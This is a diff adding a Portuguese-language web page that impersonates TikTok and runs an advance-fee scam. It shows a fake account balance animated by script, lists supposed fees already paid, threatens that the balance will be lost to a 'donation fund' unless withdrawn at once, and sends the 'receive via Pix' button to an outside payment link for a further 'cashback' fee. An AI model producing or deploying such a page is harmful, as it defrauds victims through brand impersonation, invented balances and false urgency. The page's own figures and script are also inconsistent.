@@ -1,0 +1,147 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link data-optimized="1" rel="stylesheet" href="css/5921624bf5bbe4c8c091ef09226fa76f.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+    <link data-optimized="1" href="css/1c7a3d2ee9759dc256d915300855c494.css" rel="stylesheet">
+    <link data-optimized="1" href="css/ba9cbbe9240a489628be8eb27c56db8a.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="css/slider.css">
+    <link rel="stylesheet" href="css/animated.css">
+    <link rel="shortcut icon" href="images/faveicon.png">
+    <link rel="stylesheet" href="css/notiflix-3.2.5.min.css">
+    <title>TikTok-Taxa Final ::</title>
+
+    <style>
+        /* Estilo da barra de progresso */
+        .progress-container {
+            width: 100%;
+            background-color: #f3f3f3;
+            overflow: hidden;
+            margin-bottom: 10px;
+            margin-top: -10px;
+        }
+
+        .progress-bar {
+            width: 0%;
+            height: 30px;
+            background-color: #FFDF00;
+            text-align: center;
+            line-height: 30px;
+            color: black;
+            transition: width 1s ease-in-out;
+        }
+
+        /* Estilo do botão */
+        button {
+            margin-bottom: 15px;
+            background-color: red;;
+            color: #fff;
+            border-radius: 20px;
+            width: 95%;
+            height: 60px;
+            cursor: pointer;
+            animation: pulse 1.5s infinite;
+        }
+    </style>
+</head>
+<body class="fundoWhite">
+    <div class="corteLayoutTop"></div>
+
+    <div id="p1" style="background-color: #FFFFFF; padding: 15px 0 18px 0;">
+        <img style="width: 35%; margin: auto; margin-left: 5px; position: relative; margin-top: 5px;" src="images/tik.png">
+        <div class="boxSaldo">
+            <label for="input" class="textoSaldo" style="background-color: black;">SALDO</label>
+            <p class="valorSaldo">R$ <span class="saldoAtualizado">676.08</span></p>
+        </div>
+    </div><br>
+    <div style="font-size: 11px; color: red; text-align: center; border: 1px solid red; padding: 10px; background-color: #f8d7da; border-radius: 10px 10px 10px 10px;">
+    <b>ATENÇÃO:</b><br> CASO NÃO SAQUE O DINHEIRO DE IMEDIATO, ELE SERÁ ENVIADO PARA UM FUNDO DE DOAÇÃO E PERDERÁ 100% DO SALDO!
+</div>
+
+    <div id="produto1" style="width: 100%;">
+        <div style="text-align: center; display: flex; padding: 10px; justify-content: center; align-items: center; flex-direction: column; align-content: center; flex-wrap: wrap; position: relative;">
+            ❖<br>
+
+            <p style="font-size: 16px;"><b>RECEBA O DINHEIRO DAS TAXAS DE VOLTA</b><br>
+                </p><p style="font-size: 12px;">Veja abaixo os valores pagos em taxa:<br>
+
+                    Vaga – R$ 19,90<br>
+                    Taxa de Afiliação – R$ 29,90<br>
+                    Taxa de Adiantamento de Saque – R$ 34,93<br>
+                    Tarifa do Adiantamento de Saque – R$ 31,84<br>
+                    Total de taxas: R$  116,57<br><br>
+                    
+                    Valor a receber com as taxas: R$ 676,08<br><br>
+                    
+                    Para receber suas taxas de volta (R$ 116,57) é necessário efetuar o pagamento na tarifa CASHBACK equivalente a 11% do valor das taxas.<br><br>
+                    
+                    Após o pagamento automaticamente irá receber um pix no valor de R$ 676,08.
+            </p><p></p>
+
+            <button id="paymentButton">RECEBER TODOS VALORES <br>NO PIX AGORA<br></button>
+            <p style="font-size: 12px; color: gray;">
+                TikTok 2024<br>
+                Todos os direitos reservados.
+            </p>
+        </div>
+    </div>
+
+    <script src="js/notiflix-3.2.5.min.js"></script>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            const saldoElemento = document.querySelector('.saldoAtualizado');
+            const saldoFinal = 676,08;
+            const saldoInicial = 644.95;
+            const duracao = 2000; // Duração total em milissegundos (3 segundos)
+            const passos = 100; // Número de passos na animação
+            const incremento = (saldoFinal - saldoInicial) / passos;
+            const tempo = duracao / passos;
+    
+            let saldoAtual = saldoInicial;
+    
+            function atualizarSaldo() {
+                saldoAtual += incremento;
+                saldoElemento.textContent = saldoAtual.toFixed(2);
+                
+                if (saldoAtual < saldoFinal) {
+                    setTimeout(atualizarSaldo, tempo);
+                } else {
+                    saldoElemento.textContent = saldoFinal.toFixed(2);
+                }
+            }
+    
+            atualizarSaldo();
+        });
+    </script>
+    
+    <script type="text/javascript">
+        // Função para atualizar a barra de progresso
+        function updateProgressBar() {
+            const progressBar = document.getElementById('myProgressBar');
+            let width = 0;
+            const interval = setInterval(() => {
+                if (width >= 95) {
+                    clearInterval(interval);
+                } else {
+                    width++;
+                    progressBar.style.width = width + '%';
+                    progressBar.textContent = width + '%';
+                }
+            }, 10); // Tempo de atualização em milissegundos (ajuste se necessário)
+        }
+
+        // Chama a função quando a página carregar
+        window.onload = updateProgressBar;
+
+        document.getElementById('paymentButton').addEventListener('click', function() {
+            window.location.href = 'https://pay.sunize.com.br/KlgvhdLK'; // Substitua 'pagina-destino.html' pela URL para a qual deseja redirecionar
+        });
+    </script>
+
+
+
+</body></html>
